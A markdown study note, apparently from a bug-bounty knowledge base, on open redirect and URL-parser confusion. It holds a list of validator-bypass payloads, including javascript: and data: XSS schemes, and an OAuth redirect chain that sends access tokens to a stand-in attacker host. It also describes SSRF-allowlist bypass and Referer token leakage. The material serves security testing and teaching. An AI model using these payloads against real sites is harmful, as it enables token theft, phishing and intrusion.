# Open Redirect and URL Parsing

Open redirect looks trivial until you realize how often it is the pivot that makes a bigger bug work: OAuth token theft, SSRF filter bypass, CSP bypass, and credential phishing from a trusted domain. The depth here is in URL parser confusion, which also underpins SSRF and access-control bypasses.

## The mental model

A redirect sends the browser to a URL the app chose, often partly from user input (`?next=`, `?return=`, `?url=`). If the app does not strictly validate that the destination is on its own origin, you redirect the victim anywhere. The subtlety is that URLs are parsed inconsistently by browsers, validators, and backends, so a string that a validator reads as "same origin" is read by the browser as "attacker origin." That discrepancy is the entire bug class, and it recurs in SSRF and allowlist checks.

## Where it hides / tell-tales

- **Redirect parameters**: `?next=`, `?return=`, `?returnUrl=`, `?redirect=`, `?url=`, `?dest=`, `?continue=`, `?u=`, `?r=`, `?callback=`, `?image=`, and login/logout flows that bounce you back.
- **Meta/JS redirects**: not just `Location:` headers; `<meta http-equiv=refresh>`, `window.location = param`, and framework client-side routers.
- **"Safe" validation that is not**: checks for `http://target.com` as a prefix, or that the string contains `target.com`, or that it starts with `/` (but `//evil.tld` and `/\evil.tld` are protocol-relative/backslash tricks).
- **Redirect inside OAuth/SSO**: a `redirect_uri` or `RelayState` that allows an open-redirect-capable path on an otherwise-allowed host. This is where open redirect becomes token theft (see `OAuth-and-OIDC.md`).

## Real material

Bypasses for naive validators (the URL-parsing confusion set):

```
//evil.tld                      (protocol-relative; browser goes to evil.tld)
/\evil.tld                      (backslash treated as slash by browsers)
/%2f/evil.tld
https:evil.tld                  (missing slashes, some parsers accept)
https://target.com@evil.tld     (userinfo; host is evil.tld)
https://evil.tld#@target.com    (fragment; host is evil.tld)
https://evil.tld\@target.com
https://target.com.evil.tld     (suffix)
https://evil.tld/target.com     (substring match passes)
http://evil.tld%2f%2e%2e
https://target%E3%80%82evil.tld (unicode dot U+3002 that some parsers normalize)
javascript:alert(document.domain)   (if redirect goes into href/JS sink -> XSS)
data:text/html,<script>...</script>
```

The host-confusion primitive (why `@` and `#` work): a URL `https://A@B/` has host `B` and userinfo `A`. A validator that string-matches `target.com` sees it in `A`; the browser connects to `B`.

Open redirect to OAuth token theft (the high-impact chain):

```
https://auth.target.com/authorize?client_id=app&response_type=token
  &redirect_uri=https://app.target.com/redirect?to=//evil.tld
# app.target.com/redirect is an open redirect on an allowed host;
# the access token in the fragment rides along to evil.tld.
```

## Beyond the basics

- **Parser differential is the transferable skill**: the same host-confusion that bypasses redirect validation bypasses SSRF allowlists (`SSRF.md`) and access-control host checks. Learn how WHATWG URL parsing, backend URL libraries, and proxies differ on userinfo, backslashes, fragments, encoded slashes, and unicode normalization. One mental model, many bug classes.
- **Redirect-to-XSS**: if the redirect value lands in a `javascript:` or `data:` URL, or is written into `location`/`href` without scheme filtering, you get XSS, not just redirection. Always test `javascript:` and `data:` schemes on redirect sinks.
- **Chaining, not reporting alone**: pure open redirect is often low or informational on bug bounty programs. Its value is as a component: OAuth/OIDC code and token theft, SSRF filter bypass (redirect the server-side fetcher to an internal host), CSP bypass (redirect through an allowlisted domain), cookie/token leakage via `Referer`, and more convincing phishing from the trusted domain. Report the chain.
- **Server-side redirect following (SSRF)**: when a server-side component follows redirects, an open redirect on an allowed host lets you send the server anywhere; this is a primary SSRF-allowlist bypass technique.
- **Referer-based token leakage**: a redirect that passes through a page carrying a secret in the URL leaks it to the destination via `Referer`; combine with an open redirect to exfiltrate reset tokens, CSRF tokens, and OAuth codes.
- **Unicode and normalization**: IDN homographs, fullwidth characters, and unicode dots/slashes that normalize differently in the validator vs the resolver. Also double-encoding (`%252f`) that one layer decodes and another does not.

## What to watch for

- Many programs mark standalone open redirect as low; lead with the chain (OAuth/SSRF/CSP) for real severity.
- A redirect that only works to same-site paths is not open; confirm the browser actually navigates to an external origin you control.
- Modern URL libraries (WHATWG-compliant) closed many classic tricks; test the current parser rather than assuming.
- Do not use redirects to phish real users beyond a controlled proof.

## Hunting checklist

- Find every redirect parameter and client-side redirect sink.
- Run the parser-confusion bypass set (`//`, `\`, `@`, `#`, suffix, substring, unicode, double-encoding).
- Test `javascript:`/`data:` schemes for redirect-to-XSS.
- Look for the bigger chain: OAuth `redirect_uri`, SSRF allowlist, CSP allowlist, `Referer` token leak.
- Reuse the same host-confusion payloads against SSRF and host-based access checks.
